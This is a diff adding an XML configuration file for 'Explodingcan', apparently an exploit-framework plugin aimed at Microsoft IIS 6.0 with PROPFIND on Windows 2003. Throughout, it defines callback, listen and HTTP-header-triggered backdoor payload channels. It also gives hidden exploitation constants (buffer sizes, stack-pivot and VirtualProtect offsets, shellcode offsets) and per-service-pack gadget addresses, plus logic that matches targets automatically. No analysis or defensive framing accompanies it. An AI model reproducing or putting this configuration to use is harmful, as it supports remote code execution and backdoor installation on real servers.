@@ -1,0 +1,625 @@
+<?xml version='1.0' encoding='utf-8'?>
+<config xmlns='urn:trch' name='Explodingcan' version='2.0.2' schemaversion='2.1.0' configversion='2.0.2.0' id='9b6d2c7a836744e5cd54e4db262f09c67a5cae17'>
+  <inputparameters>
+    <paramchoice name='PayloadAccessType' description='Callback/Listen Payload Access'>
+      <paramgroup name='Callback' description='Target connect() callback for payload upload connection'>
+        <parameter type='IPv4' name='CallbackIp' description='Callback IP Address'/>
+        <parameter type='TcpPort' name='CallbackPort' description='Callback port'/>
+        <parameter type='TcpPort' name='CallbackLocalPort' description='Local callback port'/>
+      </paramgroup>
+      <paramgroup name='Listen' description='Target listen()/accept() for payload upload connection'>
+        <parameter type='TcpPort' name='ListenPort' description='Listen port for shellcode to listen/accept on target'/>
+        <parameter type='TcpPort' name='ListenLocalPort' description='Local listen por'/>
+        <parameter type='U16' name='CallinTimeout' description='Sleep time before making callin to target'>
+          <default>10</default>
+        </parameter>
+      </paramgroup>
+      <paramgroup name='Backdoor' description='Target open HTTP backdoor for payload upload connection'>
+        <paramchoice name='BackdoorHeader' description='Name of HTTP header used to trigger backdoor.'>
+          <default>If-Match</default>
+          <paramgroup name='Accept' description=''>
+            <parameter hidden='true' type='U32' name='BackdoorIndex' description=''>
+              <default>20</default>
+            </parameter>
+          </paramgroup>
+          <paramgroup name='Accept-Charset' description=''>
+            <parameter hidden='true' type='U32' name='BackdoorIndex' description=''>
+              <default>21</default>
+            </parameter>
+          </paramgroup>
+          <paramgroup name='Accept-Encoding' description=''>
+            <parameter hidden='true' type='U32' name='BackdoorIndex' description=''>
+              <default>22</default>
+            </parameter>
+          </paramgroup>
+          <paramgroup name='Accept-Language' description=''>
+            <parameter hidden='true' type='U32' name='BackdoorIndex' description=''>
+              <default>23</default>
+            </parameter>
+          </paramgroup>
+          <paramgroup name='Allow' description=''>
+            <parameter hidden='true' type='U32' name='BackdoorIndex' description=''>
+              <default>10</default>
+            </parameter>
+          </paramgroup>
+          <paramgroup name='Authorization' description=''>
+            <parameter hidden='true' type='U32' name='BackdoorIndex' description=''>
+              <default>24</default>
+            </parameter>
+          </paramgroup>
+          <paramgroup name='Cache-Control' description=''>
+            <parameter hidden='true' type='U32' name='BackdoorIndex' description=''>
+              <default>0</default>
+            </parameter>
+          </paramgroup>
+          <paramgroup name='Content-Encoding' description=''>
+            <parameter hidden='true' type='U32' name='BackdoorIndex' description=''>
+              <default>13</default>
+            </parameter>
+          </paramgroup>
+          <paramgroup name='Content-Language' description=''>
+            <parameter hidden='true' type='U32' name='BackdoorIndex' description=''>
+              <default>14</default>
+            </parameter>
+          </paramgroup>
+          <paramgroup name='Content-Location' description=''>
+            <parameter hidden='true' type='U32' name='BackdoorIndex' description=''>
+              <default>15</default>
+            </parameter>
+          </paramgroup>
+          <paramgroup name='Content-MD5' description=''>
+            <parameter hidden='true' type='U32' name='BackdoorIndex' description=''>
+              <default>16</default>
+            </parameter>
+          </paramgroup>
+          <paramgroup name='Content-Range' description=''>
+            <parameter hidden='true' type='U32' name='BackdoorIndex' description=''>
+              <default>17</default>
+            </parameter>
+          </paramgroup>
+          <paramgroup name='Content-Type' description=''>
+            <parameter hidden='true' type='U32' name='BackdoorIndex' description=''>
+              <default>12</default>
+            </parameter>
+          </paramgroup>
+          <paramgroup name='Cookie' description=''>
+            <parameter hidden='true' type='U32' name='BackdoorIndex' description=''>
+              <default>25</default>
+            </parameter>
+          </paramgroup>
+          <paramgroup name='Date' description=''>
+            <parameter hidden='true' type='U32' name='BackdoorIndex' description=''>
+              <default>2</default>
+            </parameter>
+          </paramgroup>
+          <paramgroup name='Expect' description=''>
+            <parameter hidden='true' type='U32' name='BackdoorIndex' description=''>
+              <default>26</default>
+            </parameter>
+          </paramgroup>
+          <paramgroup name='Expires' description=''>
+            <parameter hidden='true' type='U32' name='BackdoorIndex' description=''>
+              <default>18</default>
+            </parameter>
+          </paramgroup>
+          <paramgroup name='From' description=''>
+            <parameter hidden='true' type='U32' name='BackdoorIndex' description=''>
+              <default>27</default>
+            </parameter>
+          </paramgroup>
+          <paramgroup name='If-Match' description=''>
+            <parameter hidden='true' type='U32' name='BackdoorIndex' description=''>
+              <default>29</default>
+            </parameter>
+          </paramgroup>
+          <paramgroup name='If-Modified-Since' description=''>
+            <parameter hidden='true' type='U32' name='BackdoorIndex' description=''>
+              <default>30</default>
+            </parameter>
+          </paramgroup>
+          <paramgroup name='If-None-Match' description=''>
+            <parameter hidden='true' type='U32' name='BackdoorIndex' description=''>
+              <default>31</default>
+            </parameter>
+          </paramgroup>
+          <paramgroup name='If-Range' description=''>
+            <parameter hidden='true' type='U32' name='BackdoorIndex' description=''>
+              <default>32</default>
+            </parameter>
+          </paramgroup>
+          <paramgroup name='If-Unmodified-Since' description=''>
+            <parameter hidden='true' type='U32' name='BackdoorIndex' description=''>
+              <default>33</default>
+            </parameter>
+          </paramgroup>
+          <paramgroup name='Last-Modified' description=''>
+            <parameter hidden='true' type='U32' name='BackdoorIndex' description=''>
+              <default>19</default>
+            </parameter>
+          </paramgroup>
+          <paramgroup name='Max-Forwards' description=''>
+            <parameter hidden='true' type='U32' name='BackdoorIndex' description=''>
+              <default>34</default>
+            </parameter>
+          </paramgroup>
+          <paramgroup name='Pragma' description=''>
+            <parameter hidden='true' type='U32' name='BackdoorIndex' description=''>
+              <default>4</default>
+            </parameter>
+          </paramgroup>
+          <paramgroup name='Proxy-Authorization' description=''>
+            <parameter hidden='true' type='U32' name='BackdoorIndex' description=''>
+              <default>35</default>
+            </parameter>
+          </paramgroup>
+          <paramgroup name='Range' description=''>
+            <parameter hidden='true' type='U32' name='BackdoorIndex' description=''>
+              <default>37</default>
+            </parameter>
+          </paramgroup>
+          <paramgroup name='Referer' description=''>
+            <parameter hidden='true' type='U32' name='BackdoorIndex' description=''>
+              <default>36</default>
+            </parameter>
+          </paramgroup>
+          <paramgroup name='Trailer' description=''>
+            <parameter hidden='true' type='U32' name='BackdoorIndex' description=''>
+              <default>5</default>
+            </parameter>
+          </paramgroup>
+          <paramgroup name='Translate' description=''>
+            <parameter hidden='true' type='U32' name='BackdoorIndex' description=''>
+              <default>39</default>
+            </parameter>
+          </paramgroup>
+          <paramgroup name='Upgrade' description=''>
+            <parameter hidden='true' type='U32' name='BackdoorIndex' description=''>
+              <default>7</default>
+            </parameter>
+          </paramgroup>
+          <paramgroup name='User-Agent' description=''>
+            <parameter hidden='true' type='U32' name='BackdoorIndex' description=''>
+              <default>40</default>
+            </parameter>
+          </paramgroup>
+          <paramgroup name='Via' description=''>
+            <parameter hidden='true' type='U32' name='BackdoorIndex' description=''>
+              <default>8</default>
+            </parameter>
+          </paramgroup>
+          <paramgroup name='Warning' description=''>
+            <parameter hidden='true' type='U32' name='BackdoorIndex' description=''>
+              <default>9</default>
+            </parameter>
+          </paramgroup>
+        </paramchoice>
+        <paramchoice name='BackdoorValueSource' description='Method of generating value for HTTP trigger header.'>
+          <default>RandomEtag</default>
+          <paramgroup name='Manual' description='Operator-controlled value.'>
+            <parameter type='String' name='BackdoorValue' description='HTTP header value used to trigger backdoor.'/>
+          </paramgroup>
+          <paramgroup name='RandomEtag' description='Randomly generated HTTP Etag string.'>
+            <parameter hidden='true' type='String' name='BackdoorValue' description=''>
+              <default>&lt;RANDOM_ETAG&gt;</default>
+            </parameter>
+          </paramgroup>
+          <paramgroup name='RandomBasicAuth' description='Randomly generated Basic Auth credential string.'>
+            <parameter hidden='true' type='String' name='BackdoorValue' description=''>
+              <default>&lt;RANDOM_BASIC_AUTH&gt;</default>
+            </parameter>
+          </paramgroup>
+        </paramchoice>
+        <parameter type='U32' name='BackdoorDelay' description='How long to wait (in seconds) for trigger responses.'>
+          <default>10</default>
+        </parameter>
+        <parameter type='U32' name='BackdoorRetries' description='Maximum number of times to try triggering the backdoor.'>
+          <default>1</default>
+        </parameter>
+        <parameter type='LocalFile' name='PccpPy' description='Full path to pccp.pyc.'>
+          <value>D:\DSZOPSDISK\storage\pccp.pyc</value>
+        </parameter>
+        <parameter type='LocalFile' name='BackdoorBridgeDLL' description='Full path to IIS-backdoor-to-PC-host DLL.'>
+          <value>D:\DSZOPSDISK\storage\brdg.dll</value>
+        </parameter>
+        <parameter type='LocalFile' name='PythonExe' description='Full path to Python [2.6] executable.'>
+          <value>C:\Python26\python.exe</value>
+        </parameter>
+      </paramgroup>
+    </paramchoice>
+    <parameter type='IPv4' name='TargetIp' description='Target IP Address'/>
+    <parameter type='TcpPort' name='TargetPort' description='Port of the HTTP service'>
+      <default>80</default>
+    </parameter>
+    <parameter type='U16' name='NetworkTimeout' description='Network timeout (in seconds)'>
+      <default>60</default>
+    </parameter>
+    <parameter type='Boolean' name='EnableSSL' description='Enable SSL for HTTPS targets'>
+      <default>false</default>
+    </parameter>
+    <parameter type='U32' name='IISPathSize' description='Length of IIS path (between 3 and 68)'>
+      <default>18</default>
+    </parameter>
+    <parameter type='String' name='hostString' description='String to use in HTTP requests'>
+      <default>localhost</default>
+    </parameter>
+    <paramchoice name='AuthenticationType' description='Authentication type for target'>
+      <default>None</default>
+      <paramgroup name='None' description='No authentication'/>
+      <paramgroup name='Basic' description='Basic HTTP authentication'>
+        <parameter type='String' name='Username' description='Valid basic authenticiation username'/>
+        <parameter type='String' name='Password' description='Valid basic authenticiation password'/>
+      </paramgroup>
+    </paramchoice>
+    <parameter hidden='true' type='U32' name='buf1size' description=''>
+      <value>0x110</value>
+    </parameter>
+    <parameter hidden='true' type='U32' name='buf2size' description=''>
+      <value>0xc00</value>
+    </parameter>
+    <parameter hidden='true' type='U32' name='SkipFree' description=''>
+      <value>0x02020202</value>
+    </parameter>
+    <parameter hidden='true' type='U32' name='SkipOffset' description=''>
+      <value>0xDC</value>
+    </parameter>
+    <parameter hidden='true' type='U32' name='VirtualProtectOffset' description=''>
+      <value>0x11C</value>
+    </parameter>
+    <parameter hidden='true' type='U32' name='WriteAddressOffset1' description=''>
+      <value>0xE0</value>
+    </parameter>
+    <parameter hidden='true' type='U32' name='WriteAddressOffset2' description=''>
+      <value>0x124</value>
+    </parameter>
+    <parameter hidden='true' type='U32' name='ObjectAddress' description=''>
+      <value>0x100</value>
+    </parameter>
+    <parameter hidden='true' type='U32' name='ObjectAddressOffset1' description=''>
+      <value>0x10C</value>
+    </parameter>
+    <parameter hidden='true' type='U32' name='ObjectAddressOffset4' description=''>
+      <value>0xFC</value>
+    </parameter>
+    <parameter hidden='true' type='U32' name='ObjectAddressOffset2' description=''>
+      <value>0xE8</value>
+    </parameter>
+    <parameter hidden='true' type='U32' name='ObjectAddressOffset3' description=''>
+      <value>0xD8</value>
+    </parameter>
+    <parameter hidden='true' type='U32' name='MovEcxEspOffset' description=''>
+      <value>0xFC</value>
+    </parameter>
+    <parameter hidden='true' type='U32' name='StackAdjustOffset1' description=''>
+      <value>0xDC</value>
+    </parameter>
+    <parameter hidden='true' type='U32' name='StackAdjustOffset2' description=''>
+      <value>0xE0</value>
+    </parameter>
+    <parameter hidden='true' type='U32' name='StackAdjustOffset3' description=''>
+      <value>0x138</value>
+    </parameter>
+    <parameter hidden='true' type='U32' name='Push40Offset' description=''>
+      <value>0x10C</value>
+    </parameter>
+    <parameter hidden='true' type='U32' name='LeaveRetOffset1' description=''>
+      <value>0x134</value>
+    </parameter>
+    <parameter hidden='true' type='U32' name='LeaveRetOffset2' description=''>
+      <value>0x174</value>
+    </parameter>
+    <parameter hidden='true' type='U32' name='SetEbp1' description=''>
+      <value>0x174</value>
+    </parameter>
+    <parameter hidden='true' type='U32' name='SetEbp1Offset' description=''>
+      <value>0x130</value>
+    </parameter>
+    <parameter hidden='true' type='U32' name='SetEbp2' description=''>
+      <value>0x15C</value>
+    </parameter>
+    <parameter hidden='true' type='U32' name='SetEbp2Offset' description=''>
+      <value>0x14c</value>
+    </parameter>
+    <parameter hidden='true' type='U32' name='SetEbp3' description=''>
+      <value>0x138</value>
+    </parameter>
+    <parameter hidden='true' type='U32' name='SetEbp3Offset' description=''>
+      <value>0x170</value>
+    </parameter>
+    <parameter hidden='true' type='U32' name='MovEbpOffset' description=''>
+      <value>0x150</value>
+    </parameter>
+    <parameter hidden='true' type='U32' name='ShellcodeAddr' description=''>
+      <value>0x1a0</value>
+    </parameter>
+    <parameter hidden='true' type='U32' name='ShellcodeAddrOffset' description=''>
+      <value>0x118</value>
+    </parameter>
+    <parameter hidden='true' type='U32' name='ShellcodeOffset' description=''>
+      <value>0x178</value>
+    </parameter>
+    <parameter hidden='true' type='U32' name='JmpEBXOffset' description=''>
+      <value>0x114</value>
+    </parameter>
+    <parameter hidden='true' type='U32' name='ProcHandleOffset' description=''>
+      <value>0x120</value>
+    </parameter>
+    <parameter hidden='true' type='U32' name='VProtSizeOffset' description=''>
+      <value>0x128</value>
+    </parameter>
+    <parameter hidden='true' type='U32' name='LoadEaxOffset' description=''>
+      <value>0x138</value>
+    </parameter>
+    <parameter hidden='true' type='U32' name='EaxValOffset' description=''>
+      <value>0x160</value>
+    </parameter>
+    <parameter hidden='true' type='U32' name='LoadEax2Offset' description=''>
+      <value>0x168</value>
+    </parameter>
+    <paramchoice name='Target' description='Target OS'>
+      <paramgroup name='W2K3SP0' description='Windows 2003 Base'>
+        <parameter hidden='true' type='U32' name='MovEcxEsp' description=''>
+          <value>0x010021d0</value>
+        </parameter>
+        <parameter hidden='true' type='U32' name='WriteAddress' description=''>
+          <value>0x01002030</value>
+        </parameter>
+        <parameter hidden='true' type='U32' name='MovEcxEsp' description=''>
+          <value>0xffffffff</value>
+        </parameter>
+        <parameter hidden='true' type='U32' name='StackAdjust' description=''>
+          <value>0xffffffff</value>
+        </parameter>
+        <parameter hidden='true' type='U32' name='Push40' description=''>
+          <value>0xffffffff</value>
+        </parameter>
+        <parameter hidden='true' type='U32' name='LeaveRet' description=''>
+          <value>0xffffffff</value>
+        </parameter>
+        <parameter hidden='true' type='U32' name='MovEbp' description=''>
+          <value>0xffffffff</value>
+        </parameter>
+        <parameter hidden='true' type='U32' name='JmpEBX' description=''>
+          <value>0xffffffff</value>
+        </parameter>
+        <parameter hidden='true' type='U32' name='SyscallAddress' description=''>
+          <value>0xffffffff</value>
+        </parameter>
+        <parameter hidden='true' type='U32' name='VProtSize' description=''>
+          <value>0x01002034</value>
+        </parameter>
+        <parameter hidden='true' type='U32' name='LoadEax' description=''>
+          <value>0xffffffff</value>
+        </parameter>
+        <parameter hidden='true' type='U32' name='EaxValAddress' description=''>
+          <value>0xffffffff</value>
+        </parameter>
+        <parameter hidden='true' type='U32' name='LoadEax2' description=''>
+          <value>0xffffffff</value>
+        </parameter>
+      </paramgroup>
+      <paramgroup name='W2K3SP1' description='Windows 2003 Service Pack 1'>
+        <parameter hidden='true' type='U32' name='WriteAddress' description=''>
+          <value>0x01003030</value>
+        </parameter>
+        <parameter hidden='true' type='U32' name='MovEcxEsp' description=''>
+          <value>0x68015cd2</value>
+        </parameter>
+        <parameter hidden='true' type='U32' name='StackAdjust' description=''>
+          <value>0x68006D5F</value>
+        </parameter>
+        <parameter hidden='true' type='U32' name='Push40' description=''>
+          <value>0x6800B023</value>
+        </parameter>
+        <parameter hidden='true' type='U32' name='LeaveRet' description=''>
+          <value>0x6801277f</value>
+        </parameter>
+        <parameter hidden='true' type='U32' name='MovEbp' description=''>
+          <value>0x68006d15</value>
+        </parameter>
+        <parameter hidden='true' type='U32' name='JmpEBX' description=''>
+          <value>0x6801227b</value>
+        </parameter>
+        <parameter hidden='true' type='U32' name='SyscallAddress' description=''>
+          <value>0x7ffe0300</value>
+        </parameter>
+        <parameter hidden='true' type='U32' name='VProtSize' description=''>
+          <value>0x6802906c</value>
+        </parameter>
+        <parameter hidden='true' type='U32' name='LoadEax' description=''>
+          <value>0x680092a1</value>
+        </parameter>
+        <parameter hidden='true' type='U32' name='EaxValAddress' description=''>
+          <value>0x68008156</value>
+        </parameter>
+        <parameter hidden='true' type='U32' name='LoadEax2' description=''>
+          <value>0x680229a1</value>
+        </parameter>
+      </paramgroup>
+      <paramgroup name='W2K3SP2' description='Windows 2003 Service Pack 2'>
+        <parameter hidden='true' type='U32' name='WriteAddress' description=''>
+          <value>0x680312C0</value>
+        </parameter>
+        <parameter hidden='true' type='U32' name='MovEcxEsp' description=''>
+          <value>0x68016082</value>
+        </parameter>
+        <parameter hidden='true' type='U32' name='StackAdjust' description=''>
+          <value>0x68006E4F</value>
+        </parameter>
+        <parameter hidden='true' type='U32' name='Push40' description=''>
+          <value>0x6800B113</value>
+        </parameter>
+        <parameter hidden='true' type='U32' name='LeaveRet' description=''>
+          <value>0x680129E7</value>
+        </parameter>
+        <parameter hidden='true' type='U32' name='MovEbp' description=''>
+          <value>0x68006e05</value>
+        </parameter>
+        <parameter hidden='true' type='U32' name='JmpEBX' description=''>
+          <value>0x680124e3</value>
+        </parameter>
+        <parameter hidden='true' type='U32' name='SyscallAddress' description=''>
+          <value>0x7ffe0300</value>
+        </parameter>
+        <parameter hidden='true' type='U32' name='VProtSize' description=''>
+          <value>0x6803046e</value>
+        </parameter>
+        <parameter hidden='true' type='U32' name='LoadEax' description=''>
+          <value>0x68009391</value>
+        </parameter>
+        <parameter hidden='true' type='U32' name='EaxValAddress' description=''>
+          <value>0x68008246</value>
+        </parameter>
+        <parameter hidden='true' type='U32' name='LoadEax2' description=''>
+          <value>0x68021daa</value>
+        </parameter>
+      </paramgroup>
+      <paramgroup name='W2K3SP0_v5IM' description='Windows 2003 Base (IIS 5.0 Isolation Mode)'>
+        <parameter hidden='true' type='U32' name='MovEcxEsp' description=''>
+          <value>0x010043d0</value>
+        </parameter>
+        <parameter hidden='true' type='U32' name='WriteAddress' description=''>
+          <value>0x01004230</value>
+        </parameter>
+        <parameter hidden='true' type='U32' name='MovEcxEsp' description=''>
+          <value>0xffffffff</value>
+        </parameter>
+        <parameter hidden='true' type='U32' name='StackAdjust' description=''>
+          <value>0xffffffff</value>
+        </parameter>
+        <parameter hidden='true' type='U32' name='Push40' description=''>
+          <value>0xffffffff</value>
+        </parameter>
+        <parameter hidden='true' type='U32' name='LeaveRet' description=''>
+          <value>0xffffffff</value>
+        </parameter>
+        <parameter hidden='true' type='U32' name='MovEbp' description=''>
+          <value>0xffffffff</value>
+        </parameter>
+        <parameter hidden='true' type='U32' name='JmpEBX' description=''>
+          <value>0xffffffff</value>
+        </parameter>
+        <parameter hidden='true' type='U32' name='SyscallAddress' description=''>
+          <value>0xffffffff</value>
+        </parameter>
+        <parameter hidden='true' type='U32' name='VProtSize' description=''>
+          <value>0x01004234</value>
+        </parameter>
+        <parameter hidden='true' type='U32' name='LoadEax' description=''>
+          <value>0xffffffff</value>
+        </parameter>
+        <parameter hidden='true' type='U32' name='EaxValAddress' description=''>
+          <value>0xffffffff</value>
+        </parameter>
+        <parameter hidden='true' type='U32' name='LoadEax2' description=''>
+          <value>0xffffffff</value>
+        </parameter>
+      </paramgroup>
+      <paramgroup name='W2K3SP1_v5IM' description='Windows 2003 Service Pack 1 (IIS 5.0 Isolation Mode)'>
+        <parameter hidden='true' type='U32' name='WriteAddress' description=''>
+          <value>0x01004200</value>
+        </parameter>
+        <parameter hidden='true' type='U32' name='MovEcxEsp' description=''>
+          <value>0x68015cd2</value>
+        </parameter>
+        <parameter hidden='true' type='U32' name='StackAdjust' description=''>
+          <value>0x68006D5F</value>
+        </parameter>
+        <parameter hidden='true' type='U32' name='Push40' description=''>
+          <value>0x6800B023</value>
+        </parameter>
+        <parameter hidden='true' type='U32' name='LeaveRet' description=''>
+          <value>0x6801277f</value>
+        </parameter>
+        <parameter hidden='true' type='U32' name='MovEbp' description=''>
+          <value>0x68006d15</value>
+        </parameter>
+        <parameter hidden='true' type='U32' name='JmpEBX' description=''>
+          <value>0x6801227b</value>
+        </parameter>
+        <parameter hidden='true' type='U32' name='SyscallAddress' description=''>
+          <value>0x7ffe0300</value>
+        </parameter>
+        <parameter hidden='true' type='U32' name='VProtSize' description=''>
+          <value>0x6802906c</value>
+        </parameter>
+        <parameter hidden='true' type='U32' name='LoadEax' description=''>
+          <value>0x680092a1</value>
+        </parameter>
+        <parameter hidden='true' type='U32' name='EaxValAddress' description=''>
+          <value>0x68008156</value>
+        </parameter>
+        <parameter hidden='true' type='U32' name='LoadEax2' description=''>
+          <value>0x680229a1</value>
+        </parameter>
+      </paramgroup>
+    </paramchoice>
+  </inputparameters>
+  <outputparameters>
+    <paramchoice name='Contract' description='The contract fulfilled by this plugin'>
+      <value>StagedUpload</value>
+      <paramgroup name='StagedUpload' description=''>
+        <parameter type='Socket' name='ConnectedTcp' description='The connected socket'/>
+        <parameter type='U8' name='XorMask' description='Masking byte'/>
+      </paramgroup>
+    </paramchoice>
+  </outputparameters>
+  <errors>
+    <errorcode name='EXCA_SUCCESS' value='EDF_SUCCESS' description='Explodingcan executed successfully.'/>
+  </errors>
+  <redirection>
+    <local protocol='TCP' listenaddr='TargetIp' listenport='TargetPort' closeoncompletion='true' destaddr='TargetIp' destport='TargetPort'/>
+    <local protocol='TCP' listenaddr='TargetIp' listenport='ListenLocalPort' closeoncompletion='true' destaddr='TargetIp' destport='ListenPort'/>
+    <remote protocol='TCP' listenport='CallbackPort' listenaddr='CallbackIp' destport='CallbackLocalPort'/>
+  </redirection>
+  <logic>
+    <and>
+      <or>
+        <service name='http'>
+          <and>
+            <product version='6.0' name='Microsoft IIS'/>
+            <service name='http-option-propfind'>
+              <bindtovalue name='EnableSSL' value='false'/>
+              <bindtopath path="//service[name='http']/port" name='TargetPort'/>
+              <bindtopath path="//service[name='http']/product/misc_product_info[name='IISPathSize']/value" name='IISPathSize'/>
+            </service>
+          </and>
+        </service>
+        <service name='https'>
+          <and>
+            <product version='6.0' name='Microsoft IIS'/>
+            <service name='http-option-propfind'>
+              <bindtovalue name='EnableSSL' value='true'/>
+              <bindtopath path="//service[name='https']/port" name='TargetPort'/>
+              <bindtopath path="//service[name='https']/product/misc_product_info[name='IISPathSize']/value" name='IISPathSize'/>
+            </service>
+          </and>
+        </service>
+      </or>
+      <or>
+        <os servicepack='2' name='Windows 2003' family='windows'>
+          <bindtovalue name='Target' value='W2K3SP2'/>
+        </os>
+        <os servicepack='1' name='Windows 2003' family='windows'>
+          <bindtovalue name='Target' value='W2K3SP1'/>
+        </os>
+        <os servicepack='0' name='Windows 2003' family='windows'>
+          <bindtovalue name='Target' value='W2K3SP0'/>
+        </os>
+        <os servicepack='unknown' name='Windows 2003' family='windows'>
+          <or>
+            <os>
+              <bindtovalue name='Target' value='W2K3SP2'/>
+            </os>
+            <os>
+              <bindtovalue name='Target' value='W2K3SP0'/>
+            </os>
+            <os>
+              <bindtovalue name='Target' value='W2K3SP1'/>
+            </os>
+          </or>
+        </os>
+      </or>
+      <bindtovalue name='PayloadAccessType' value='Callback'/>
+    </and>
+  </logic>
+</config>
